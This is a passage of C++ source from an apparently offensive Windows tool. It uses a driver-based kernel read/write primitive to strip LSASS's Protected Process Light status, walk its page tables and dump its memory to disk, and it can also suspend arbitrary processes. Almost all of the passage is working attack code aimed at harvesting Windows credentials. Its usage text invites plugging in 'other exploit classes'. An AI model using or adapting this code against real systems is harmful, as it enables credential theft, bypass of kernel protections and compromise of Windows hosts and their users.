    return ok;
}

bool DataOnlyGadgetTool::WriteUserVAWithDTB(KernelReadWrite* phys, uint64_t dtb, uint64_t va, const void* buffer, size_t size) {
    if (!phys || dtb == 0 || !buffer || size == 0) return false;
    if (!phys->SupportsPhysical()) return false;
    uint64_t cr3 = dtb & ~0xFFFULL;
    uint64_t cr3Phys = phys->VirtToPhys(cr3);
    if (cr3Phys) cr3 = cr3Phys;
    constexpr uint64_t PFN_MASK = (1ULL << 40) - 1;

    size_t done = 0;
    const uint8_t* in = static_cast<const uint8_t*>(buffer);
    auto readEntry = [&](uint64_t pa, uint64_t& val) -> bool {
        return phys->ReadPhysical(pa, &val, sizeof(val));
    };

    while (done < size) {
        uint64_t cur = va + done;
        uint16_t pml4 = (cur >> 39) & 0x1FF;
        uint64_t e1 = 0;
        if (!readEntry(cr3 + pml4 * 8ULL, e1) || (e1 & 1) == 0) return false;

        uint16_t pdpt = (cur >> 30) & 0x1FF;
        uint64_t e2 = 0;
        uint64_t pdptBase = ((e1 >> 12) & PFN_MASK) << 12;
        if (!readEntry(pdptBase + pdpt * 8ULL, e2) || (e2 & 1) == 0) return false;
        if (e2 & (1ULL << 7)) return false; // large page not handled for writes

        uint16_t pd = (cur >> 21) & 0x1FF;
        uint64_t pdBase = ((e2 >> 12) & PFN_MASK) << 12;
        uint64_t e3 = 0;
        if (!readEntry(pdBase + pd * 8ULL, e3) || (e3 & 1) == 0) return false;
        if (e3 & (1ULL << 7)) return false;

        uint16_t pt = (cur >> 12) & 0x1FF;
        uint64_t ptBase = ((e3 >> 12) & PFN_MASK) << 12;
        uint64_t e4 = 0;
        if (!readEntry(ptBase + pt * 8ULL, e4) || (e4 & 1) == 0) return false;

        uint64_t pa = ((e4 >> 12) & PFN_MASK) << 12 | (cur & 0xFFF);
        size_t chunk = std::min<size_t>(size - done, 0x1000 - (cur & 0xFFF));
        if (!phys->WritePhysical(pa, in + done, chunk)) return false;
        done += chunk;
    }
    return true;
}

bool DataOnlyGadgetTool::PatchWDigest(KernelReadWrite* phys, uint64_t dtb, uint64_t peb) {
    UNREFERENCED_PARAMETER(phys);
    UNREFERENCED_PARAMETER(dtb);
    UNREFERENCED_PARAMETER(peb);
    return true;
}

bool DataOnlyGadgetTool::ConvertRawToMinidump(const std::string& inPath, const std::string& outPath) {
    std::string in = inPath.empty() ? "lsass_dtb.raw" : inPath;
    std::string out = outPath.empty() ? "lsass_from_raw.dmp" : outPath;
    bool ok = ConvertLsassRawToMinidump(in, out);
    if (ok) {
        std::cout << "[+] Converted " << in << " -> " << out << std::endl;
    } else {
        std::cout << "[-] Failed to convert " << in << " to minidump" << std::endl;
    }
    return ok;
}

bool DataOnlyGadgetTool::DumpLsass(bool useMinidump) {
    if (!rw->SupportsPhysical() && !useMinidump) {
        std::cout << "[!] LSASS dump requires a physical-capable backend." << std::endl;
        return false;
    }
    if (discoveredGadgets.empty()) {
        std::cout << "[!] No gadgets loaded. Run 'discover' first." << std::endl;
        return false;
    }

    // Find LSASS token gadget to obtain PID / EPROCESS
    uint32_t lsassPid = 0;
    uint64_t lsassEproc = 0;
    for (auto& [addr, g] : discoveredGadgets) {
        if (g.type != GadgetType::TOKEN_FIELD) continue;
        std::string lower = g.owner_process;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        if (lower.find("lsass") != std::string::npos) {
            lsassPid = static_cast<uint32_t>(g.process_id);
            lsassEproc = g.structure_base ? g.structure_base : (g.address - g.field_offset);
            break;
        }
    }
    if (!lsassPid || !lsassEproc) {
        std::cout << "[!] LSASS gadgets not present. Run discovery with patterns/xrefs enabled." << std::endl;
        return false;
    }

    auto offsets = offsetManager->GetCurrentOffsets();
    if (offsets.eprocess_directory_table_base == 0) {
        std::cout << "[!] Missing eprocess_directory_table_base offset." << std::endl;
        return false;
    }

    uint64_t dtb = 0;
    if (!rw->ReadMemory(lsassEproc + offsets.eprocess_directory_table_base, &dtb, sizeof(dtb)) || dtb == 0) {
        std::cout << "[!] Failed to read LSASS DTB." << std::endl;
        return false;
    }
    // Try UserDirectoryTableBase (common with KPTI) if offset known
    if (offsets.eprocess_user_directory_table_base) {
        uint64_t userDir = 0;
        if (rw->ReadMemory(lsassEproc + offsets.eprocess_user_directory_table_base, &userDir, sizeof(userDir)) && userDir) {
            dtb = userDir;
            if (kVerboseLsass)
                std::cout << "[dbg] Using UserDirectoryTableBase 0x" << std::hex << dtb << std::dec << std::endl;
        }
    }
    if (useMinidump) {
        // Ensure LSASS is no longer protected before taking a minidump
        std::cout << "[*] Clearing LSASS PPL (Protection -> 0) before minidump..." << std::endl;
        auto pplChain = chaining->FindPPLBypassChain(lsassPid, 0x00);
        if (!pplChain.IsValid()) {
            std::cout << "[-] No writable _EPROCESS.Protection entry for LSASS; cannot bypass PPL" << std::endl;
            return false;
        }
        if (!chaining->ExecuteChain(pplChain)) {
            std::cout << "[-] Failed to clear LSASS PPL; aborting minidump" << std::endl;
            return false;
        }
        std::cout << "[+] LSASS PPL cleared." << std::endl;

        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, lsassPid);
        if (!hProc) {
            std::cout << "[-] OpenProcess failed: " << GetLastError() << std::endl;
            return false;
        }

        std::string outName = "lsass.dmp";
        HANDLE hOut = CreateFileA(outName.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                                  FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) {
            std::cout << "[-] Failed to create output file: " << GetLastError() << std::endl;
            CloseHandle(hProc);
            return false;
        }

        MINIDUMP_TYPE dtype = (MINIDUMP_TYPE)(
            MiniDumpWithFullMemory |
            MiniDumpWithHandleData |
            MiniDumpWithUnloadedModules |
            MiniDumpWithFullMemoryInfo |
            MiniDumpWithThreadInfo);

        BOOL ok = MiniDumpWriteDump(hProc, lsassPid, hOut, dtype, nullptr, nullptr, nullptr);
        CloseHandle(hOut);
        CloseHandle(hProc);
        if (!ok) {
            std::cout << "[-] MiniDumpWriteDump failed: " << GetLastError() << std::endl;
            return false;
        }

        std::cout << "> " << outName << " saved to disk" << std::endl;
        return true;
    }

    KernelReadWrite* phys = rw.get();
    uint64_t cr3Phys = phys->VirtToPhys(dtb & ~0xFFFULL);
    if (kVerboseLsass)
        std::cout << "[dbg] DirBase raw 0x" << std::hex << dtb << " phys? 0x" << cr3Phys << std::dec << std::endl;
    uint64_t cr3Base = cr3Phys ? cr3Phys : (dtb & ~0xFFFULL);

    std::cout << "[+] LSASS PID: " << lsassPid << std::endl;
    std::cout << "[+] LSASS _EPROCESS: 0x" << std::hex << lsassEproc << std::dec << std::endl;
    std::cout << "[+] LSASS DTB: 0x" << std::hex << dtb << std::dec << std::endl;

    uint64_t peb = 0;
    rw->ReadMemory(lsassEproc + offsets.eprocess_peb, &peb, sizeof(peb));
    if (phys) {
        PatchWDigest(phys, dtb, peb);
    }

    // Validate that eprocess belongs to LSASS
    uint64_t pidCheck = 0;
    if (offsets.eprocess_unique_process_id &&
        rw->ReadMemory(lsassEproc + offsets.eprocess_unique_process_id, &pidCheck, sizeof(pidCheck))) {
        if (pidCheck != lsassPid) {
            std::cout << "[!] EPROCESS pid mismatch: got " << pidCheck << " expected " << lsassPid << std::endl;
        }
    }

    // Dump PML4 entry for a known VA
    uint64_t testVA = 0x7ff700000000ULL;
    uint16_t idx = (testVA >> 39) & 0x1FF;
    uint64_t pml4Entry = 0;
    uint64_t pml4PA = cr3Base + idx * 8;
    if (kVerboseLsass) {
        if (phys->ReadPhysical(pml4PA, &pml4Entry, sizeof(pml4Entry))) {
            std::cout << "[dbg] PML4[0x" << std::hex << idx << "] @PA 0x" << pml4PA
                      << " = 0x" << pml4Entry << std::dec << std::endl;
        } else {
            std::cout << "[dbg] Failed to read PML4 entry @PA 0x" << std::hex << pml4PA << std::dec << std::endl;
        }
    }

    // Quick scan for mapped PDPTs to locate user regions
    constexpr uint64_t PFN_MASK = (1ULL << 40) - 1;
    struct MappedBase { uint64_t va; uint64_t pa; uint32_t pageSize; };
    struct PageSeed  { uint64_t va; uint64_t pa; uint32_t pageSize; };
    std::vector<uint64_t> pageSeeds;          // legacy 2MB-aligned seeds
    std::vector<PageSeed> pteSeeds;           // exact 4K pages discovered
    // Walk an entire PDPT to list present PD/PTEs (debug)
    auto WalkPDPTDump = [&](int pml4i, int pdpti) {
        uint64_t cr3BaseLocal = cr3Phys ? cr3Phys : (dtb & ~0xFFFULL);
        uint64_t pml4e = 0;
        if (!phys->ReadPhysical(cr3BaseLocal + pml4i * 8ULL, &pml4e, sizeof(pml4e)) || !(pml4e & 1)) {
            std::cout << "[pdpt] PML4[" << std::hex << pml4i << "] not present" << std::dec << std::endl;
            return;
        }
        uint64_t pdptBase = ((pml4e >> 12) & PFN_MASK) << 12;
        uint64_t pdpte = 0;
        if (!phys->ReadPhysical(pdptBase + pdpti * 8ULL, &pdpte, sizeof(pdpte)) || !(pdpte & 1)) {
            std::cout << "[pdpt] PDPT[" << std::hex << pdpti << "] under PML4[" << pml4i << "] not present" << std::dec << std::endl;
            return;
        }
        uint64_t pdBase = ((pdpte >> 12) & PFN_MASK) << 12;
        std::cout << "[pdpt] Walking PML4[" << std::hex << pml4i << "] PDPT[" << pdpti << "] pdBase PA 0x" << pdBase << std::dec << std::endl;
        int pdHits = 0;
        for (int pd = 0; pd < 512; ++pd) {
            uint64_t pde = 0;
            if (!phys->ReadPhysical(pdBase + pd * 8ULL, &pde, sizeof(pde))) break;
            if (!(pde & 1)) continue;
            uint64_t va = (static_cast<uint64_t>(pml4i) << 39) | (static_cast<uint64_t>(pdpti) << 30) | (static_cast<uint64_t>(pd) << 21);
            std::cout << "[pd]  idx=" << pd << " VA 0x" << std::hex << va
                      << (pde & (1ULL << 7) ? " (2MB)" : " (pt)") << " pde=0x" << pde << std::dec << std::endl;
            pdHits++;
            if ((pde & (1ULL << 7)) || pdHits > 4) continue; // skip PTE dump for large pages; limit verbose
            uint64_t ptBase = ((pde >> 12) & PFN_MASK) << 12;
            int pteHits = 0;
            for (int pt = 0; pt < 512 && pteHits < 64; ++pt) { // collect plenty of leaves
                uint64_t pte = 0;
                if (!phys->ReadPhysical(ptBase + pt * 8ULL, &pte, sizeof(pte))) break;
                if (!(pte & 1)) continue;
                uint64_t pageVa = va | (static_cast<uint64_t>(pt) << 12);
                uint64_t pagePa = ((pte >> 12) & PFN_MASK) << 12;
                std::cout << "      [pte] idx=" << pt << " VA 0x" << std::hex << pageVa
                          << " pte=0x" << pte << " PA 0x" << pagePa << std::dec << std::endl;
                pteSeeds.push_back({pageVa, pagePa, 0x1000});
                pteHits++;
            }
        }
        if (pdHits == 0) std::cout << "[pdpt] No present PD entries" << std::endl;
    };

    // Non-verbose collector: walk a specific PDPT and gather all present leaves
    auto CollectPDPTPages = [&](int pml4i, int pdpti) {
        uint64_t cr3BaseLocal = cr3Phys ? cr3Phys : (dtb & ~0xFFFULL);
        uint64_t pml4e = 0;
        if (!phys->ReadPhysical(cr3BaseLocal + pml4i * 8ULL, &pml4e, sizeof(pml4e)) || !(pml4e & 1))
            return;
        uint64_t pdptBase = ((pml4e >> 12) & PFN_MASK) << 12;
        uint64_t pdpte = 0;
        if (!phys->ReadPhysical(pdptBase + pdpti * 8ULL, &pdpte, sizeof(pdpte)) || !(pdpte & 1))
            return;
        uint64_t pdBase = ((pdpte >> 12) & PFN_MASK) << 12;
        for (int pd = 0; pd < 512; ++pd) {
            uint64_t pde = 0;
            if (!phys->ReadPhysical(pdBase + pd * 8ULL, &pde, sizeof(pde))) break;
            if (!(pde & 1)) continue;
            uint64_t vaBase = (static_cast<uint64_t>(pml4i) << 39) |
                              (static_cast<uint64_t>(pdpti) << 30) |
                              (static_cast<uint64_t>(pd) << 21);
            if (pde & (1ULL << 7)) {
                pageSeeds.push_back(vaBase); // 2MB leaf
                continue;
            }
            uint64_t ptBase = ((pde >> 12) & PFN_MASK) << 12;
            for (int pt = 0; pt < 512; ++pt) {
                uint64_t pte = 0;
                if (!phys->ReadPhysical(ptBase + pt * 8ULL, &pte, sizeof(pte))) break;
                if (!(pte & 1)) continue;
                uint64_t pageVa = vaBase | (static_cast<uint64_t>(pt) << 12);
                uint64_t pagePa = ((pte >> 12) & PFN_MASK) << 12;
                pteSeeds.push_back({pageVa, pagePa, 0x1000});
            }
        }
    };

    // Page walker helper (full detail) scoped here so it is visible to scan and dumping loops
    bool verboseWalk = false;
    auto WalkFullPageTable = [&](uint64_t va) {
        struct PageInfo {
            uint64_t va;
            uint64_t pa;
            uint32_t pageSize;
            bool valid;
        } info{va, 0, 0, false};

        auto readEntry = [&](uint64_t pa, uint64_t& val) -> bool {
            return phys->ReadPhysical(pa, &val, sizeof(val));
        };

        auto dumpLevel = [&](const char* lvl, uint16_t idx, uint64_t val, uint64_t pfn) {
            if (!verboseWalk) return;
            std::cout << "[dbg] " << lvl << "[0x" << std::hex << idx << "] = 0x" << val
                      << " (PFN 0x" << pfn << ")" << std::dec << std::endl;
        };

        uint64_t cr3BaseLocal = cr3Phys ? cr3Phys : (dtb & ~0xFFFULL);

        uint16_t pml4 = (va >> 39) & 0x1FF;
        uint64_t e1 = 0;
        if (!readEntry(cr3BaseLocal + pml4 * 8ULL, e1) || !(e1 & 1)) return info;
        uint64_t pdptBase = ((e1 >> 12) & PFN_MASK) << 12;
        dumpLevel("PML4", pml4, e1, (e1 >> 12) & PFN_MASK);

        uint16_t pdpt = (va >> 30) & 0x1FF;
        uint64_t e2 = 0;
        if (!readEntry(pdptBase + pdpt * 8ULL, e2) || !(e2 & 1)) return info;
        dumpLevel("PDPT", pdpt, e2, (e2 >> 12) & PFN_MASK);
        if (e2 & (1ULL << 7)) {
            info.pageSize = 0x40000000;
            info.pa = ((e2 >> 12) & PFN_MASK) << 12 | (va & (info.pageSize - 1));
            info.valid = true;
            return info;
        }

        uint64_t pdBase = ((e2 >> 12) & PFN_MASK) << 12;
        uint16_t pd = (va >> 21) & 0x1FF;
        uint64_t e3 = 0;
        if (!readEntry(pdBase + pd * 8ULL, e3) || !(e3 & 1)) return info;
        dumpLevel("PD", pd, e3, (e3 >> 12) & PFN_MASK);
        if (e3 & (1ULL << 7)) {
            info.pageSize = 0x200000;
            info.pa = ((e3 >> 12) & PFN_MASK) << 12 | (va & (info.pageSize - 1));
            info.valid = true;
            return info;
        }

        uint64_t ptBase = ((e3 >> 12) & PFN_MASK) << 12;
        uint16_t pt = (va >> 12) & 0x1FF;
        uint64_t e4 = 0;
        if (!readEntry(ptBase + pt * 8ULL, e4) || !(e4 & 1)) return info;
        dumpLevel("PT", pt, e4, (e4 >> 12) & PFN_MASK);

        info.pageSize = 0x1000;
        info.pa = ((e4 >> 12) & PFN_MASK) << 12 | (va & 0xFFF);
        info.valid = true;
        return info;
    };

    std::cout << "[*] Enumerating present user pages (best-effort, capped)..." << std::endl;

    // Quick probe of a likely-mapped VA to verify page-walk + read
    uint8_t probe[0x1000] = {0};
    if (ReadUserVAWithDTB(phys, dtb, 0x7ff700000000ULL, probe, sizeof(probe))) {
        size_t nz = 0;
        for (auto b : probe) if (b) nz++;
        std::cout << "[dbg] Probe VA 0x7ff700000000: non-zero bytes=" << nz << "/" << sizeof(probe) << std::endl;
    } else {
        std::cout << "[dbg] Probe VA 0x7ff700000000 failed" << std::endl;
    }
    // KUSER_SHARED_DATA test (must succeed if DTB is correct)
    uint64_t kuser = 0;
    if (ReadUserVAWithDTB(phys, dtb, 0x7ffe0000ULL, &kuser, sizeof(kuser))) {
        uint32_t maj = static_cast<uint32_t>((kuser >> 16) & 0xFFFF);
        uint32_t min = static_cast<uint32_t>(kuser & 0xFFFF);
        std::cout << "[+] KUSER_SHARED_DATA test PASSED: 0x" << std::hex << kuser << std::dec
                  << " NtMajor=" << maj << " NtMinor=" << min << std::endl;
    } else {
        std::cout << "[-] KUSER_SHARED_DATA test FAILED - DTB likely wrong" << std::endl;
    }

    const size_t maxDump = 256ULL * 1024 * 1024; // cap to ~256MB to mirror MiniDump size
    struct DumpPage {
        uint64_t va = 0;
        std::vector<uint8_t> data;
    };
    std::vector<DumpPage> pages;
    size_t totalBytes = 0;
    uint8_t key[32] = {0}; // keep zeros; no encryption

    HANDLE lsassHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
    auto copyPageViaRpm = [&](uint64_t) {};

    // Pre-fault committed user pages into memory so PTEs become present.
    if (lsassHandle) {
        MEMORY_BASIC_INFORMATION mbi{};
        uint8_t* addr = nullptr;
        while (VirtualQueryEx(lsassHandle, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT &&
                !(mbi.Protect & PAGE_NOACCESS) &&
                !(mbi.Protect & PAGE_GUARD) &&
                (reinterpret_cast<uint64_t>(mbi.BaseAddress) < 0x0000800000000000ULL)) {
                char tmp = 0;
                SIZE_T read = 0;
                ReadProcessMemory(lsassHandle, mbi.BaseAddress, &tmp, 1, &read); // best-effort
            }
            addr += mbi.RegionSize;
        }
    }

    // Full user-space walk: PML4[0..255], PDPT[0..511], PD/PT present pages.
    // Stop once we hit maxDump to keep runtime bounded.
    auto readPageSized = [&](uint64_t va, uint64_t pa, size_t size) {
        if (size == 0) return;
        if (totalBytes + size > maxDump) return;
        DumpPage p;
        p.va = va;
        p.data.resize(size);
        if (phys->ReadPhysical(pa, p.data.data(), size)) {
            pages.push_back(std::move(p));
            totalBytes += size;
        }
    };

    for (uint16_t pml4 = 0; pml4 < 256 && totalBytes < maxDump; ++pml4) {
        uint64_t e1 = 0;
        if (!phys->ReadPhysical(cr3Base + pml4 * 8ULL, &e1, sizeof(e1)) || (e1 & 1) == 0) continue;
        uint64_t pdptBase = ((e1 >> 12) & PFN_MASK) << 12;

        for (uint16_t pdpt = 0; pdpt < 512 && totalBytes < maxDump; ++pdpt) {
            uint64_t e2 = 0;
            uint64_t pdptVaBase = (static_cast<uint64_t>(pml4) << 39) |
                                  (static_cast<uint64_t>(pdpt) << 30);
            if (!phys->ReadPhysical(pdptBase + pdpt * 8ULL, &e2, sizeof(e2)) || (e2 & 1) == 0) continue;
            if (e2 & (1ULL << 7)) {
                // Skip 1GB large pages to mirror MiniDumpWriteDump user coverage
                continue;
            }

            uint64_t pdBase = ((e2 >> 12) & PFN_MASK) << 12;
            for (uint16_t pd = 0; pd < 512 && totalBytes < maxDump; ++pd) {
                uint64_t e3 = 0;
                uint64_t pdVaBase = pdptVaBase | (static_cast<uint64_t>(pd) << 21);
                if (!phys->ReadPhysical(pdBase + pd * 8ULL, &e3, sizeof(e3)) || (e3 & 1) == 0) continue;
                if (e3 & (1ULL << 7)) {
                    // Skip 2MB large pages; stick to 4K leaves
                    continue;
                }

                uint64_t ptBase = ((e3 >> 12) & PFN_MASK) << 12;
                for (uint16_t pt = 0; pt < 512 && totalBytes < maxDump; ++pt) {
                    uint64_t e4 = 0;
                    uint64_t va = pdVaBase |
                                  (static_cast<uint64_t>(pt) << 12);
                    bool present = false;
                    if (phys->ReadPhysical(ptBase + pt * 8ULL, &e4, sizeof(e4)) && (e4 & 1)) {
                        present = true;
                    }

                    if (present) {
                        uint64_t pa = ((e4 >> 12) & PFN_MASK) << 12;
                        readPageSized(va, pa, 0x1000);
                    }
                }
            }
        }
    }

    std::sort(pages.begin(), pages.end(), [](const DumpPage& a, const DumpPage& b) { return a.va < b.va; });

    FILE* f = fopen("lsass_dtb.raw", "wb");
    if (!f) {
        std::cout << "[!] Failed to open output file." << std::endl;
        return false;
    }
    const char hdr[] = "LSADMP2";
    fwrite(hdr, 1, sizeof(hdr), f);
    fwrite(&lsassPid, 1, sizeof(lsassPid), f);
    fwrite(&lsassEproc, 1, sizeof(lsassEproc), f);
    fwrite(&dtb, 1, sizeof(dtb), f);
    uint32_t pageCount = static_cast<uint32_t>(pages.size());
    fwrite(&pageCount, 1, sizeof(pageCount), f);
    uint32_t reserved = 0;
    fwrite(&reserved, 1, sizeof(reserved), f);
    fwrite(key, 1, 32, f);
    for (auto& p : pages) {
        uint64_t va = p.va;
        uint32_t sz = static_cast<uint32_t>(p.data.size());
        uint32_t flags = 0;
        fwrite(&va, 1, sizeof(va), f);
        fwrite(&sz, 1, sizeof(sz), f);
        fwrite(&flags, 1, sizeof(flags), f);
        fwrite(p.data.data(), 1, sz, f);
    }
    fclose(f);

    // Headerless raw dump: contiguous page data only (sorted by VA)
    uint64_t imageBase = 0;
    if (peb) {
        ReadUserVAWithDTB(phys, dtb, peb + 0x10, &imageBase, sizeof(imageBase)); // PEB->ImageBaseAddress
    }
    char rawName[64] = {};
    uint64_t nameBase = imageBase ? imageBase : lsassEproc;
    snprintf(rawName, sizeof(rawName), "lsass_pages_0x%016llx.raw", static_cast<unsigned long long>(nameBase));
    FILE* fraw = fopen(rawName, "wb");
    if (fraw) {
        for (auto& p : pages) {
            fwrite(p.data.data(), 1, p.data.size(), fraw);
        }
        fclose(fraw);
    }
    if (lsassHandle) CloseHandle(lsassHandle);
    std::cout << "[+] Saved LSASS dump to lsass_dtb.raw (" << totalBytes << " bytes, plaintext, " << pages.size() << " pages)" << std::endl;
    return true;
}

bool DataOnlyGadgetTool::SuspendProcess(uint32_t pid) {
    if (pid == 0) {
        std::cout << "[!] Invalid PID." << std::endl;
        return false;
    }

    struct DOG_OBJECT_ATTRIBUTES {
        ULONG Length;
        HANDLE RootDirectory;
        PVOID ObjectName;
        ULONG Attributes;
        PVOID SecurityDescriptor;
        PVOID SecurityQualityOfService;
    };
    struct DOG_CLIENT_ID {
        HANDLE UniqueProcess;
        HANDLE UniqueThread;
    };

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) {
        std::cout << "[!] Failed to load ntdll.dll" << std::endl;
        return false;
    }

    using NtSuspendProcess_t = NTSTATUS (NTAPI*)(HANDLE);
    using NtOpenProcess_t = NTSTATUS (NTAPI*)(PHANDLE, ACCESS_MASK, DOG_OBJECT_ATTRIBUTES*, DOG_CLIENT_ID*);
    auto NtSuspendProcessFn = reinterpret_cast<NtSuspendProcess_t>(
        GetProcAddress(ntdll, "NtSuspendProcess"));
    auto NtOpenProcessFn = reinterpret_cast<NtOpenProcess_t>(
        GetProcAddress(ntdll, "NtOpenProcess"));
    if (!NtSuspendProcessFn || !NtOpenProcessFn) {
        std::cout << "[!] NtSuspendProcess/NtOpenProcess not found" << std::endl;
        return false;
    }

    HANDLE hProc = nullptr;
    DOG_OBJECT_ATTRIBUTES oa{};
    oa.Length = sizeof(oa);
    DOG_CLIENT_ID cid{};
    cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(pid));
    cid.UniqueThread = nullptr;

    NTSTATUS status = NtOpenProcessFn(&hProc, PROCESS_SUSPEND_RESUME, &oa, &cid);
    if (status < 0 || !hProc) {
        std::cout << "[!] NtOpenProcess failed for PID " << pid
                  << " (NTSTATUS 0x" << std::hex << status << std::dec << ")" << std::endl;
        return false;
    }

    status = NtSuspendProcessFn(hProc);
    CloseHandle(hProc);

    if (status < 0) {
        std::cout << "[!] NtSuspendProcess failed for PID " << pid
                  << " (NTSTATUS 0x" << std::hex << status << std::dec << ")" << std::endl;
        return false;
    }

    std::cout << "[+] Suspended process PID " << pid << std::endl;
    return true;
}

// Main entry point
int main() {
    // Check if running as administrator
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    // Set console title
    SetConsoleTitleA("Data-Only Gadget Discovery Tool");

    std::string restartCmd = GetCommandLineA();

    // Enable virtual terminal processing for colors
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD consoleMode;
    GetConsoleMode(hConsole, &consoleMode);
    SetConsoleMode(hConsole, consoleMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
    
    // Print logo
    PrintLogo();
    
    if (!isAdmin) {
        std::cout << "[!] WARNING: Not running as administrator!" << std::endl;
        std::cout << "[!] This tool requires administrator privileges for kernel access." << std::endl;
        std::cout << "[!] Please restart as Administrator." << std::endl << std::endl;
    }
    
    // Parse optional driver/translator args
    DriverConfig drvCfg{};
    bool usePhysmem = false;
    std::string command;
    std::string commandArg;
    bool enablePatternScan = false;
    bool enableCrossRefs = false;
    bool enableValidation = false;

    for (int i = 1; i < __argc; ++i) {
        std::string arg = __argv[i];
        if ((arg == "--driver_sym" || arg == "--driver") && i + 1 < __argc) {
            std::string sym = __argv[++i];
            // allow user to pass with or without \\.\ prefix
            if (sym.rfind("\\\\.\\", 0) == 0) drvCfg.device_path = sym;
            else drvCfg.device_path = "\\\\.\\" + sym;
            usePhysmem = true;
        } else if (arg == "--driver-sys" && i + 1 < __argc) {
            drvCfg.driver_sys = __argv[++i];
            usePhysmem = true;
        } else if (arg == "--service" && i + 1 < __argc) {
            drvCfg.service_name = __argv[++i];
            usePhysmem = true;
        } else if (arg == "--map" && i + 1 < __argc) {
            drvCfg.ioctl_map = static_cast<uint32_t>(strtoul(__argv[++i], nullptr, 0));
            usePhysmem = true;
        } else if (arg == "--unmap" && i + 1 < __argc) {
            drvCfg.ioctl_unmap = static_cast<uint32_t>(strtoul(__argv[++i], nullptr, 0));
            usePhysmem = true;
        } else if (arg == "--translator" && i + 1 < __argc) {
            std::string mode = __argv[++i];
            if (mode == "superfetch") drvCfg.translator = DriverConfig::Translator::Superfetch;
            else if (mode == "cr3")    drvCfg.translator = DriverConfig::Translator::Cr3;
            usePhysmem = true;
        } else if (arg == "--cr3" && i + 1 < __argc) {
            drvCfg.cr3 = _strtoui64(__argv[++i], nullptr, 0);
        } else if (arg == "--pattern-scan") {
            enablePatternScan = true;
        } else if (arg == "--xrefs") {
            enableCrossRefs = true;
        } else if (arg == "--validate") {
            enableValidation = true;
        } else if (command.empty() && arg.rfind("--", 0) != 0) {
            command = arg;
            // optional following token (e.g., chain name)
            if (i + 1 < __argc && __argv[i + 1][0] != '-') {
                commandArg = __argv[i + 1];
            }
        }
    }

    // Choose R/W primitive (driver required)
    if (!usePhysmem) {
        std::cout << "[!] A kernel R/W backend is required. Current build expects a physical mapper:" << std::endl;
        std::cout << "    --driver_sym DevName --driver-sys path\\driver.sys --map 0x... [--unmap 0x...] --translator superfetch|cr3" << std::endl;
        std::cout << "    (Swap backend in RwFactory.cpp to use a different primitive.)" << std::endl;
        return 1;
    }
    std::unique_ptr<KernelReadWrite> rw = CreateKernelReadWrite(drvCfg);
    if (!rw || !rw->IsDriverAvailable()) {
        std::cout << "[!] Failed to initialize kernel R/W driver." << std::endl;
        return 1;
    }

    // Create and run tool
    DataOnlyGadgetTool tool(std::move(rw), drvCfg, enablePatternScan, enableCrossRefs, enableValidation, restartCmd);
    tool.PrintSystemInfo();

    if (!command.empty()) {
        if (command == "discover") {
            tool.RunFullDiscovery();
            tool.ExportGadgets("gadgets.json");
        }
        else if (command == "exec" && !commandArg.empty()) {
            tool.RunFullDiscovery();
            tool.ShowChains();
            tool.ExecuteChain(commandArg);
        }
        else if (command == "raw2dmp") {
            std::string in = commandArg.empty() ? "lsass_dtb.raw" : commandArg;
            tool.ConvertRawToMinidump(in, "lsass_from_raw.dmp");
        }
        else {
            std::cout << "Usage: " << __argv[0] << " [discover|exec <chain>] "
                      << "[--driver_sym DevName --driver-sys path\\to\\driver.sys --service Name "
                      << "--map 0x... --unmap 0x... --translator superfetch|cr3 --cr3 0x... "
                      << "--pattern-scan --xrefs --validate]" << std::endl;
            std::cout << "Backend note: RwFactory.cpp selects the R/W primitive; swap it to plug other exploit classes." << std::endl;
        }
    } else {
        tool.PrintHelp();
        tool.InteractiveMenu();
    }
    
    return 0;
}


